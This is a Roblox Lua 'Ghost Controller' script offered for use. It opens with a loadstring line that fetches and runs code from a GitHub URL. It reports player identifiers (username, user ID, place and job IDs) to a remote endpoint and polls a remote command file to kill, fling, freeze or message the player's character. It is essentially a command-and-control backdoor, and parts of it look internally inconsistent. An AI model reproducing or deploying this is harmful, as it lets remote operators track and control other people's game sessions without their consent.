-- GHOST CONTROLLER - HTTP Remote Control
-- Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/angelluckey572-tech/-/blob/main/controller.lua"))()

local CONFIG = {
    SECRET = "YOUR_SECRET_KEY",
    COMMAND_URL = "https://raw.githubusercontent.com/angelluckey572-tech/-/main/commands.json",
    REPORT_URL = "http://your-site.com/api",
    CHECK_TIME = 30
}

-- Get player info
local Player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

local function getInfo()
    return {
        username = Player.Name,
        userid = Player.UserId,
        placeid = game.PlaceId,
        jobid = game.JobId,
        time = os.time()
    }
end

-- Send info to server
local function report()
    local info = getInfo()
    info.secret = CONFIG.SECRET
    
    pcall(function()
        HttpService:PostAsync(CONFIG.REPORT_URL, HttpService:JSONEncode(info))
    end)
end

-- Execute commands
local function execCmd(cmd)
    local char = Player.Character
    if not char then return end
    
    if cmd == "kill" then
        char:BreakJoints()
    elseif cmd == "fling" then
        if char:FindFirstChild("HumanoidRootPart") then
            char.HumanoidRootPart.Velocity = Vector3.new(10000, 10000, 10000)
        end
    elseif cmd == "freeze" then
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("BasePart") then
                v.Anchored = true
            end
        end
    elseif cmd == "unfreeze" then
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("BasePart") then
                v.Anchored = false
            end
        end
    elseif cmd:sub(1,4) == "msg:" then
        local msg = cmd:sub(5)
        local gui = Instance.new("ScreenGui")
        local text = Instance.new("TextLabel")
        text.Text = msg
        text.Size = UDim2.new(1,0,0,50)
        text.Position = UDim2.new(0,0,0.5,0)
        text.BackgroundTransparency = 1
        text.TextColor3 = Color3.fromRGB(255,50,50)
        text.TextSize = 24
        text.Parent = gui
        gui.Parent = Player:WaitForChild("PlayerGui")
        game:GetService("Debris"):AddItem(gui, 3)
    end
end

-- Check for commands
local function checkCommands()
    while true do
        task.wait(CONFIG.CHECK_TIME)
        
        pcall(function()
            local data = HttpService:GetAsync(CONFIG.COMMAND_URL .. "?t=" .. os.time())
            if data then
                local commands = HttpService:JSONDecode(data)
                if commands and commands.secret == CONFIG.SECRET then
                    local myId = tostring(Player.UserId)
                    if commands[myId] then
                        for _, cmd in ipairs(commands[myId]) do
                            execCmd(cmd)
                        end
                    end
                end
            end
        end)
    end
end

-- Start
report()
spawn(checkCommands)
